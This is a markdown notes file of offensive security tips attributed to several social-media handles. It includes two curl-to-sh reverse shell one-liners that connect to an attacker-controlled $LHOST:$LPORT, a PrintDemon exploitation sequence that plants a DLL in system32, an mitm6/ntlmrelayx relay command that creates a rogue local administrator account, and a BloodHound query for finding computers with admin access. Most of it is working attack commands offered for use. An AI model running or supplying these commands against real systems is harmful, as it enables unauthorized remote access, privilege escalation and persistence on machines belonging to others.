# notes

### @joevennix writes:

````
reverse curl is a solid payload:

P=$(mktemp -u);mkfifo $P;curl -sNkT . https://$LHOST:$LPORT<$P|sh>$P
````
(diskless on linux):

````  
{ curl -sNkT . https://$LHOST:$LPORT </dev/fd/3| sh 3>&-;} 3>&1|:
````
diskless linux reverse shell :fire:

### @noopy writes:

````
["Computers you have admin on","HTML","pwn.html","MATCH (m:Group {name: 'GROUP@EXAMPLE.COM'})-[r:AdminTo]->(n:Computer) RETURN http://n.name"]
Copy+paste -> CrackMapExec
````
Bloodhound tip. :star:

### @neosysforensics ™  for PrintDemon bug on Windows 7

```
1. Set-WmiInstance -Class Win32_Printer -Argument @{DriverName="Generic / Text Only" ;PortName="c:\windows\system32\mydll.dll" ;DeviceID="EvilPrinter" ;RawOnly="True"}

2. $printers=Get-WmiObject Win32_Printer

3. $printer = $printers | where {$_.name -eq "EvilPrinter"}

4. $printer.Pause()

5. Start-Process -FilePath “mydll.txt" -Verb Print

--Reboot the system--

6. $printers=Get-WmiObject Win32_Printer
7. $printer = $printers | where {$ _.name -eq "EvilPrinter"}
8. $printer.Resume()
```
### @akita_zen from Argentina says

```
cat alive-subdomains.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
```

### From Paul Seekamp @nullenc0de...

SMB Signing enabled? NetBIOS and LLMNR disabled? Need another way in?

```
mitm6 -i eth0 -d example.local

ntlmrelayx.py -ip 0.0.0.0 -t rpc://example.local -c "net user nullenc0de nullen0code_is_Here /add && net localgroup Administrators nullenc0de /add"
```

### @liamsomerville 

A quick and easy way of pretty printing JSON web tokens: 

```` echo "<JWT>" | tr "." "\n" | base64 -D | jq "." (-d on Linux) ````

